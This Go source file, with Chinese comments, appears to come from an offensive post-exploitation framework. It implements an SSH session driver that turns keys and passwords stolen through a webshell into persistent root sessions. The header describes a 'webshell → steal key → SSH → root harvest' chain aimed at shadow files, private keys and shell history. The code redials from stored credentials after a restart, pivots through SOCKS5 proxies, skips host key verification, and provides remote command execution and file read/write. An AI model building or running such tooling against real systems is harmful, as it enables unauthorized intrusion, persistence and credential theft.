// ssh_shell.go 真·SSH 会话（webshell → 扒 key → SSH → root 收割 闭环）。
//
// webshell 通道的权限天花板是 web 进程用户；worker 一次性提权扒到的
// ssh_key/密码此前只能躺在凭据库。本驱动把凭据升级成可持续会话：
// register_session(kind=ssh) 用密钥/密码直接 SSH 登录，之后 session_exec /
// session_cred_harvest 拿到的是真实 root 视野（shadow/私钥/历史全覆盖）。
// 凭据型会话还有个 webshell 不具备的优点：进程重启后可按库存凭据重拨恢复。
package session

import (
	"context"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
	xproxy "golang.org/x/net/proxy"
)

// SSHSecret 是 ssh 会话的连接参数（随 sessions.secret 落库，重启重拨恢复）。
type SSHSecret struct {
	Host     string `json:"host"`
	Port     int    `json:"port,omitempty"`
	User     string `json:"user"`
	Password string `json:"password,omitempty"`
	Key      string `json:"key,omitempty"`   // PEM 私钥正文
	Proxy    string `json:"proxy,omitempty"` // socks5://host:port，内网/隧道出口
	Platform string `json:"platform,omitempty"`
}

// SSHShell 是 Session 的 SSH 实现。每条 Exec 开一个 ssh session（无共享
// shell 状态，cwd 不持久——与 webshell 语义一致）。
type SSHShell struct {
	id     int64
	sec    SSHSecret
	client *ssh.Client
}

// DialSSH 建立 SSH 会话：密钥优先、密码兜底；proxy 非空时经 SOCKS5 出网。
func DialSSH(sec SSHSecret, timeout time.Duration) (*SSHShell, error) {
	if sec.Port <= 0 {
		sec.Port = 22
	}
	if timeout <= 0 {
		timeout = 12 * time.Second
	}
	var auths []ssh.AuthMethod
	if strings.TrimSpace(sec.Key) != "" {
		signer, err := ssh.ParsePrivateKey([]byte(sec.Key))
		if err != nil {
			return nil, fmt.Errorf("私钥解析失败: %w", err)
		}
		auths = append(auths, ssh.PublicKeys(signer))
	}
	if sec.Password != "" {
		auths = append(auths, ssh.Password(sec.Password))
	}
	if len(auths) == 0 {
		return nil, fmt.Errorf("需要 password 或 key 其一")
	}
	addr := net.JoinHostPort(sec.Host, fmt.Sprint(sec.Port))
	var conn net.Conn
	var err error
	if sec.Proxy != "" {
		d, derr := xproxy.SOCKS5("tcp", strings.TrimPrefix(sec.Proxy, "socks5://"), nil, xproxy.Direct)
		if derr != nil {
			return nil, fmt.Errorf("代理不可用: %w", derr)
		}
		conn, err = d.Dial("tcp", addr)
	} else {
		conn, err = net.DialTimeout("tcp", addr, timeout)
	}
	if err != nil {
		return nil, fmt.Errorf("TCP 不可达 %s: %w", addr, err)
	}
	cfg := &ssh.ClientConfig{
		User:            sec.User,
		Auth:            auths,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}
	c, chans, reqs, err := ssh.NewClientConn(conn, addr, cfg)
	if err != nil {
		_ = conn.Close()
		return nil, fmt.Errorf("SSH 认证/握手失败 %s@%s: %w", sec.User, addr, err)
	}
	sh := &SSHShell{sec: sec, client: ssh.NewClient(c, chans, reqs)}
	return sh, nil
}

// RestoreSSHShell 进程重启后按库存凭据重拨（SSH 是会话级协议，可恢复）。
func RestoreSSHShell(id int64, sec SSHSecret) (*SSHShell, error) {
	sh, err := DialSSH(sec, 12*time.Second)
	if err != nil {
		return nil, err
	}
	sh.id = id
	return sh, nil
}

func (s *SSHShell) ID() int64         { return s.id }
func (s *SSHShell) SetID(id int64)    { s.id = id }
func (s *SSHShell) Kind() string      { return "ssh" }
func (s *SSHShell) Secret() SSHSecret { return s.sec }

// Test 无害探针。
func (s *SSHShell) Test(ctx context.Context) error {
	out, _, err := s.Exec(ctx, "echo __sshtest__", 8*time.Second)
	if err != nil {
		return err
	}
	if !strings.Contains(out, "__sshtest__") {
		return fmt.Errorf("探针回显异常")
	}
	return nil
}

// Exec 一条命令一次 ssh session；stderr 合并进 stdout 与 webshell 语义对齐。
func (s *SSHShell) Exec(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	ectx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	sess, err := s.client.NewSession()
	if err != nil {
		return "", "", fmt.Errorf("ssh session 失败: %w", err)
	}
	defer sess.Close()
	type res struct {
		out []byte
		err error
	}
	done := make(chan res, 1)
	go func() {
		o, e := sess.CombinedOutput(cmd)
		done <- res{o, e}
	}()
	select {
	case <-ectx.Done():
		_ = sess.Signal(ssh.SIGKILL)
		_ = sess.Close()
		return "", "", fmt.Errorf("命令超时(%s)", timeout)
	case r := <-done:
		if r.err != nil {
			return string(r.out), "", fmt.Errorf("%w: %s", r.err, truncateStr(string(r.out), 300))
		}
		return string(r.out), "", nil
	}
}

// ReadFile 经 exec 读文件：stderr 独立（Output 不合并），二进制安全。
func (s *SSHShell) ReadFile(ctx context.Context, path string) ([]byte, error) {
	sess, err := s.client.NewSession()
	if err != nil {
		return nil, err
	}
	defer sess.Close()
	out, err := sess.Output("cat -- " + sshQuote(path))
	if err != nil {
		// base64 兜底：部分环境 cat 二进制经通道有损
		sess2, e2 := s.client.NewSession()
		if e2 != nil {
			return nil, err
		}
		defer sess2.Close()
		b64, e3 := sess2.Output("base64 -w0 -- " + sshQuote(path) + " 2>/dev/null || base64 -- " + sshQuote(path))
		if e3 != nil {
			return nil, err
		}
		return base64.StdEncoding.DecodeString(strings.TrimSpace(string(b64)))
	}
	return out, nil
}

// WriteFile 分块 base64 append 写（二进制安全）。
func (s *SSHShell) WriteFile(ctx context.Context, path string, data []byte) error {
	const chunk = 256 * 1024
	for off := 0; off < len(data) || (len(data) == 0 && off == 0); off += chunk {
		end := off + chunk
		if end > len(data) {
			end = len(data)
		}
		op := ">>"
		if off == 0 {
			op = ">"
		}
		enc := base64.StdEncoding.EncodeToString(data[off:end])
		if _, _, err := s.Exec(ctx, "printf %s '"+enc+"' | base64 -d "+op+" -- "+sshQuote(path), 60*time.Second); err != nil {
			return err
		}
		if len(data) == 0 {
			break
		}
	}
	return nil
}

func (s *SSHShell) Close(context.Context) error {
	if s.client != nil {
		return s.client.Close()
	}
	return nil
}

func sshQuote(p string) string {
	return "'" + strings.ReplaceAll(p, "'", `'\''`) + "'"
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}
